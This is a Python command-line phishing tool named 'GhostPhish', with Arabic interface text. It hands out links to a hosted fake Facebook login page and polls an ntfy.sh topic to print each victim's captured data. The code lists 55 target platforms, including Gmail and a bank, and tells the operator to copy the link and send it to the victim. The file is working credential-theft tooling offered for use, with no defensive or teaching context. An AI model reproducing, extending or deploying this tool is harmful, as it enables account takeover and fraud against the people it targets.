#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import urllib.request
import urllib.parse
import json
import os
import uuid
import threading
import time
import sys

# ========== الألوان حسب الصورة ==========
ORANGE = "\033[38;5;208m"   # برتقالي للشعار فقط
WHITE = "\033[97m"          # أبيض للنصوص الأساسية
GREEN = "\033[92m"          # أخضر فاتح للأرقام والحالات الإيجابية
DARK_GRAY = "\033[90m"      # رمادي للحالات السلبية (غير مفعل)
BOLD = '\033[1m'
RESET = '\033[0m'
# ==========================================

CONFIG_FILE = "ghostphish_config.json"

# ─── توليد 55 منصة (20 أصلية + 35 جديدة) ───
LINKS = {}
PLATFORMS = {}

original_names = {
    1: "فيسبوك", 2: "انستغرام", 3: "تويتر", 4: "سناب شات", 5: "تيك توك",
    6: "جيميل", 7: "ياهو", 8: "Outlook", 9: "بنك", 10: "منصة 10",
    11: "منصة 11", 12: "منصة 12", 13: "منصة 13", 14: "منصة 14", 15: "منصة 15",
    16: "منصة 16", 17: "منصة 17", 18: "منصة 18", 19: "منصة 19", 20: "منصة 20"
}
new_names = [f"منصة {i}" for i in range(21, 56)]
all_names = {**original_names, **{i+21: name for i, name in enumerate(new_names)}}
PLATFORMS = all_names

LINKS[1] = "https://facebook-vjj9.onrender.com"
for i in range(2, 56):
    LINKS[i] = ""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_or_create_secret():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            return data.get("secret", "")
    secret = "GhostPhish_" + uuid.uuid4().hex[:12]
    with open(CONFIG_FILE, "w") as f:
        json.dump({"secret": secret}, f)
    return secret

def print_banner():
    banner = f"""{ORANGE}
   ______              __  ____  __    _     __
  / ____/__  ____  ____/ /_/ __ \/ /_  (_)___/ /_
 / / __/ _ \/ __ \/ ___/ __/ /_/ / __ \/ / __/ __/
/ /_/ /  __/ /_/ (__  ) /_/ ____/ / / / (__  ) / / /
\____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
{RESET}"""
    print(banner)

def print_menu():
    total = 55
    mid = (total + 1) // 2  # 28
    print(WHITE + "═" * 60 + RESET)
    print(WHITE + BOLD + f"           قائمة المنصات ({total})" + RESET)
    print(WHITE + "═" * 60 + RESET)

    for i in range(1, mid + 1):
        left_num = i
        right_num = i + mid
        
        left_status = f"{GREEN}(مفعل)" if LINKS.get(left_num) else f"{DARK_GRAY}(غير مفعل)"
        left_line = f"{GREEN}{left_num}{RESET} - {WHITE}{PLATFORMS[left_num]} {left_status}"
        
        if right_num <= total:
            right_status = f"{GREEN}(مفعل)" if LINKS.get(right_num) else f"{DARK_GRAY}(غير مفعل)"
            right_line = f"{GREEN}{right_num}{RESET} - {WHITE}{PLATFORMS[right_num]} {right_status}"
        else:
            right_line = ""
        
        # ضبط المسافات للعمودين
        print(f"{left_line:<45}{right_line}")

    print(WHITE + "═" * 60 + RESET)
    print(f"{GREEN}0{RESET} - {WHITE}خروج{RESET}")

def display_victim_data(message):
    print("\n" + WHITE + "═" * 40 + RESET)
    print(WHITE + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
    print(WHITE + "═" * 40 + RESET)
    lines = message.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if ':' in line:
            key, val = line.split(':', 1)
            print(f"{WHITE}{BOLD}{key.strip()}{RESET}: {WHITE}{val.strip()}{RESET}")
        else:
            print(f"{WHITE}{line}{RESET}")
    print(WHITE + "═" * 40 + RESET + "\n")

def listen_ntfy(topic):
    url = f"https://ntfy.sh/{topic}/json"
    while True:
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=300) as response:
                for line in response:
                    if line:
                        try:
                            data = json.loads(line.decode('utf-8'))
                            if 'message' in data:
                                display_victim_data(data['message'])
                        except:
                            pass
        except Exception:
            time.sleep(5)

def main():
    secret = load_or_create_secret()
    clear_screen()
    print_banner()
    print(f"{WHITE}🔑 مفتاحك السري: {GREEN}{secret}{RESET}\n")
    threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
    time.sleep(1)

    while True:
        print_menu()
        choice = input(f"{GREEN}> {RESET}").strip()

        if choice == "0":
            print(f"{WHITE}إيقاف الأداة...{RESET}")
            sys.exit(0)

        if choice.isdigit():
            num = int(choice)
            if 1 <= num <= 55:
                if LINKS[num] == "":
                    clear_screen()
                    print_banner()
                    print(f"{WHITE}❌ منصة {PLATFORMS[num]} غير مفعلة بعد.{RESET}")
                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
                else:
                    link = LINKS[num] + "?topic=" + secret
                    clear_screen()
                    print_banner()
                    print(WHITE + "═" * 40 + RESET)
                    print(f"{GREEN}✅ رابط {PLATFORMS[num]}:{RESET}")
                    print(f"{GREEN}{BOLD}{link}{RESET}")
                    print(WHITE + "═" * 40 + RESET)
                    print(f"{WHITE}انسخ الرابط وأرسله للضحية.{RESET}")
                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
            else:
                clear_screen()
                print_banner()
                print(f"{WHITE}رقم غير صحيح (1-55){RESET}")
                input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                clear_screen()
                print_banner()
        else:
            clear_screen()
            print_banner()
            print(f"{WHITE}اختيار غير مفهوم{RESET}")
            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
            clear_screen()
            print_banner()

if __name__ == "__main__":
    main()
